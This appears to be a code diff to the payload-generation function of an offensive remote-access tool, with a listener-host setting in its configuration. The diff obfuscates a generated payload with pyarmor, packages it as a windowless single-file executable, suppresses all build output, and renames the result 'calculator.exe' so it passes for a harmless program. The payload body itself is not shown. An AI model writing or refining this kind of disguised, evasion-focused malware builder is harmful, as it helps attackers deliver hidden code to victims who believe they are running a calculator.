@@ -6,6 +6,7 @@ import subprocess
 import os
 import base64
 import tempfile
+import platform
 
 variablesConfig: dict = {
     "session.lhost": "localhost",
@@ -62,17 +63,36 @@ def generate(command):
         temp.close()
 
     print(f"{Color.OKGREEN}Obfuscating payload{Color.DEFAULT}")
-    subprocess.run(["pyarmor", "gen", temp.name], creationflags=subprocess.CREATE_NO_WINDOW)
+
+    flag = platform.system() == 'Windows' and subprocess.CREATE_NO_WINDOW or 0
+
+    subprocess.run(["pyarmor", "gen", temp.name], stdout=subprocess.DEVNULL,
+                    stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL ,creationflags=flag)
+
 
     ofuscated_path = os.path.join("dist", os.path.basename(temp.name))
-    print(f"{Color.OKGREEN}Building payload{Color.DEFAULT}")
-    subprocess.run(["pyinstaller", "--onefile","--noconsole", ofuscated_path], creationflags=subprocess.CREATE_NO_WINDOW)
-    print(f"{Color.OKGREEN}Payload generated successfully{Color.DEFAULT}")
-    namefile = os.path.join(os.getcwd(), "calculator.exe")
 
-    os.rename(f"{ofuscated_path}.exe", namefile)
-    os.remove(temp.name)
-    os.remove(ofuscated_path)
+    print(f"{Color.OKGREEN}Building payload{Color.DEFAULT}")
+
+    subprocess.run(["pyinstaller", "--onefile","--noconsole", ofuscated_path],  
+                   stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL,
+                     stdin=subprocess.DEVNULL,creationflags=flag)
+
+    print(f"{Color.OKGREEN}Payload generated successfully{Color.DEFAULT}")
+
+    extension = ".exe" if platform.system() == 'Windows' else ""
+
+    namefile = os.path.join(os.getcwd(), f"calculator{extension}")
+
+    if(os.path.exists(ofuscated_path)):
+        os.rename(f"{ofuscated_path}{extension}", namefile)
+
+    if(extension != ""):
+       os.remove(ofuscated_path)
+
+    if(os.path.exists(temp.name)):
+        os.remove(temp.name)
+
     
   except Exception as e:
     print(f"{Color.FAIL}Error generating payload: {e}{Color.DEFAULT}")
